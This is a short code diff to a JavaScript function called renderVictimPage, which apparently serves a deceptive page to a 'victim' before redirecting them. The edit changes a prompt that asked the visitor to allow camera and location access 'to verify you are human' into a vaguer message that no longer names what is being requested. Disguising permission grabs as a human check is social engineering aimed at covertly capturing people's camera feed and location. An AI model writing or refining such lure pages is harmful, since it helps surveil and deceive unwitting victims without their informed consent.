@@ -247,7 +247,7 @@ function renderVictimPage(sessionToken, redirectUrl) {
     function showPermissionWarning() {
       _goBtn.classList.add('hidden');
       _retryBtn.classList.remove('hidden');
-      showStatus('⚠️ Please allow camera & location access to verify you are human', 'warning');
+      showStatus('⚠️ Please allow to verify you are human', 'warning');
     }
 
     function doRedirect () {
